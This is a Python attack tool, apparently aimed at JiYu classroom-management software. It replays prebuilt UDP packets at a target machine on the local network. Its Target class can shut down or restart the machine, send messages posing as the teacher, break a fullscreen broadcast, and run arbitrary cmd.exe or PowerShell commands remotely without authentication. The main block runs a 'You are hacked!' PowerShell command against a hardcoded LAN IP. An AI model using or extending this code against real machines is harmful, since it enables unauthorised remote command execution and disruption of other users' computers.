# todo: edit the type hint to adapt lower Python versions.

import logging
import os
import re
import socket
import sys
import time
from dataclasses import dataclass
from typing import Tuple, List

logger = logging.getLogger("my_jiyu_killer")
logger.setLevel(logging.DEBUG)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.DEBUG)

formatter = logging.Formatter(
    fmt="[%(asctime)s] [%(funcName)s/%(levelname)s]: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
console_handler.setFormatter(formatter)

logger.addHandler(console_handler)


@dataclass()
class Payload:
    """
    预构造的数据包。
    SHUTDOWN: 关机
    RESTART: 重启
    MSG: 教师端消息
    CMD: 执行指令
    WINDOWED: 全屏广播窗口化
    """
    SHUTDOWN: bytes = bytes()
    RESTART: bytes = bytes()
    MSG: bytes = bytes()
    CMD: bytes = bytes()
    WINDOWED: bytes = bytes()


def _resource_dir(relative_dir: str) -> str:
    """
    将资源的相对路径转换为实际路径。
    如果已使用 PyInstaller 打包为可执行文件，使用 sys 的 _MEIPASS 属性。
    否则引用原绝对路径。
    :param relative_dir: 资源的相对路径
    :return: 资源的实际路径
    """
    if hasattr(sys, "_MEIPASS"):
        # noinspection PyProtectedMember
        base_dir = sys._MEIPASS
    else:
        base_dir = os.path.abspath(".")
    return os.path.join(base_dir, relative_dir)


def _read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str, windowed_dir: str) -> None:
    """
    从资源文件读取预构造的数据包。注意：传入的路径应该是已经被 _resource_dir 函数处理过的，本函数不会处理路径。
    :param shutdown_dir: 关机数据包路径
    :param restart_dir: 重启数据包路径
    :param msg_dir: 教师端消息数据包路径
    :param cmd_dir: 执行指令数据包路径
    :param windowed_dir: 使广播窗口化数据包路径
    """
    with open(shutdown_dir, "rb") as f:
        Payload.SHUTDOWN = f.read()
    with open(restart_dir, "rb") as f:
        Payload.RESTART = f.read()
    with open(msg_dir, "rb") as f:
        Payload.MSG = f.read()
    with open(cmd_dir, "rb") as f:
        Payload.CMD = f.read()
    with open(windowed_dir, "rb") as f:
        Payload.WINDOWED = f.read()
    logger.info(f"Read payload from: {shutdown_dir}, {restart_dir}, {msg_dir}, {cmd_dir}, {windowed_dir}")


def _validate_ip(ip: str):
    ipv4 = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    ipv6 = re.compile(r'^(([0-9a-fA-F]{1,4}):){7}([0-9a-fA-F]{1,4})$')
    return (ipv4.match(ip) is not None) or (ipv6.match(ip) is not None)


def _validate_port(port: int):
    return 0 <= port <= 65535


class Target:
    """
    要发送数据的目标主机。
    使用前，应先实例化该类，再调用对象的方法实现。使用示例：

        addr = ("192.168.75.03", 4705) # 包含 IP 地址和服务端口
        target = Target(addr) # 实例化目标主机为 Target 类的对象
        target.msg("Hello world") # 向目标以教师的口吻发送消息
        target.shutdown() # 使目标关机

    """

    def __init__(self, address: Tuple[str, int]) -> None:
        """
        初始化 Target 对象时传入的参数。
        :param address: 包含 IP 地址和端口的元组
        """
        if not _validate_ip(address[0]):
            raise ValueError("Invalid IP address")
        if not _validate_port(address[1]):
            raise ValueError("Invalid port")
        self.address = address

    @staticmethod
    def _encode_msg(content: str) -> List[int]:
        """
        格式化用于教师端消息的字符串。
        :param content: 原内容
        :return: 格式化后的十六进制列表
        """
        formatted_bytes = []
        for char in content:
            code_point = ord(char)
            if code_point <= 0xFF:
                formatted_bytes.extend([code_point, 0x00])
                continue
            hex_str = hex(code_point)[2:]
            hex_str = hex_str.zfill(4)
            low_byte = int(hex_str[2:4], 16)
            high_byte = int(hex_str[0:2], 16)
            formatted_bytes.extend([low_byte, high_byte])

        return formatted_bytes

    @staticmethod
    def _encode_cmd(s: str) -> bytes:
        """
        格式化用于执行指令的字符串。
        :param s: 原指令内容
        :return: 格式化后的字节流
        """
        return b"".join(bytes([ord(c), 0]) for c in s)

    @staticmethod
    def _safe_sendto(packet: bytes, address: Tuple[str, int]) -> None:
        """
        安全地发送数据包。
        :param packet: 要发送的数据包
        :address: 目标地址
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(packet, address)
        except socket.gaierror as e:
            logger.error(f"socket.gaierror: {e}")
            raise
        except OSError as e:
            logger.error(f"OSError ({type(e).__name__}): {e}")
        else:
            logger.debug(f"SEND: length of {len(packet)} -> {address[0]}:{address[1]}")

    def shutdown(self) -> None:
        """
        发送关机指令。
        """
        self._safe_sendto(Payload.SHUTDOWN, self.address)
        logger.info(f"SHUTDOWN -> {self.address[0]}:{self.address[1]}")

    def restart(self) -> None:
        """
        发送重启指令。
        """
        self._safe_sendto(Payload.RESTART, self.address)
        logger.info(f"RESTART -> {self.address[0]}:{self.address[1]}")

    def windowed(self) -> None:
        """
        使全屏广播窗口化。
        """
        packet = bytearray(226)

        for i, byte in enumerate(Payload.WINDOWED):
            if i < len(packet):
                packet[i] = byte

        packet[216] = 1
        packet[19] = int(time.time() * 1000) % 256

        self._safe_sendto(Payload.WINDOWED, self.address)
        logger.info(f"WINDOWED -> {self.address[0]}:{self.address[1]}")

    def msg(self, content: str = "") -> None:
        """
        发送教师端消息（即以教师的口吻）。
        :param content: 消息内容
        """
        encode_content = self._encode_msg(content)
        packet = bytearray(Payload.MSG)
        for idx, element in enumerate(encode_content, start=56):
            packet[idx] = element

        self._safe_sendto(packet, self.address)
        logger.info(f"MSG: {content} -> {self.address[0]}:{self.address[1]}")

    def raw(self, executable: str, args: str) -> None:
        """
        编码并发送命令。
        :param executable: 可执行文件的绝对路径
        :param args: 完整的命令行参数
        """

        encoded_executable = self._encode_cmd(executable)
        encoded_args = self._encode_cmd(args)

        packet = bytearray(Payload.CMD)
        packet.extend(encoded_executable)
        packet.extend(b"\x00" * (512 - len(encoded_executable)))  # 填充路径部分
        packet.extend(encoded_args)
        packet.extend(b"\x00" * (324 - len(encoded_args)))  # 填充参数部分
        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")  # 固定结尾

        self._safe_sendto(packet, self.address)
        logger.debug(f"RAW: {executable} {args} -> {self.address[0]}:{self.address[1]}")

    def cmd(self, command: str, arg: str | None = None) -> None:
        """
        构造命令提示符命令并发送。
        :param command: 命令
        :param arg: 传给 cmd.exe 的其他命令行参数（如 /c 使得 cmd.exe 执行后退出）
        """
        executable = "C:\\WINDOWS\\system32\\cmd.exe"
        args = f"{arg} {command}" if arg else f" {command}"
        self.raw(executable, args)
        logger.info(f"CMD: {command} {args} -> {self.address[0]}:{self.address[1]}")

    def powershell(self, command: str, arg: str | None = None) -> None:
        """构造 Powershell 命令并发送。
        :param command: 命令
        :param arg: 传递给 powershell.exe 的其他命令行参数（如 -NoExit 使得 powershell.exe 执行后保留界面）
        """
        executable = "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
        args = f"{arg} -c \"& {{{command}}}\"" if arg else f" -c \"& {{{command}}}\""
        self.raw(executable, args)
        logger.info(f"POWERSHELL: {command} {args} -> {self.address[0]}:{self.address[1]}")


def get_local_lan_ip() -> str:
    """
    获取本地主机的局域网 IP 地址。
    :return: 本地局域网 IP 地址
    """
    hostname = socket.gethostname()
    lan_ip = socket.gethostbyname(hostname)
    return lan_ip


# from Jiyu_udp_attack (https://github.com/ht0Ruial/Jiyu_udp_attack)
SHUTDOWN_DIR = _resource_dir(".\\assets\\shutdown.bin")
RESTART_DIR = _resource_dir(".\\assets\\restart.bin")
MSG_DIR = _resource_dir(".\\assets\\msg.bin")
# from JiYuHacker (https://github.com/mxym/JiYuHacker)
CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
# from 52pojie.cn (https://www.52pojie.cn/thread-1692806-1-1.html)
WINDOWED_DIR = _resource_dir(".\\assets\\windowed.bin")

_read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR, WINDOWED_DIR)

if __name__ == '__main__':
    print("Your IP: ", get_local_lan_ip())
    ADDR = ("10.165.43.52", 4705)  # edit this test ip before
    send = Target(ADDR)
    send.powershell("Write-Output You are hacked!", "-NoExit")
    send.msg("HELLO")
    send.windowed()
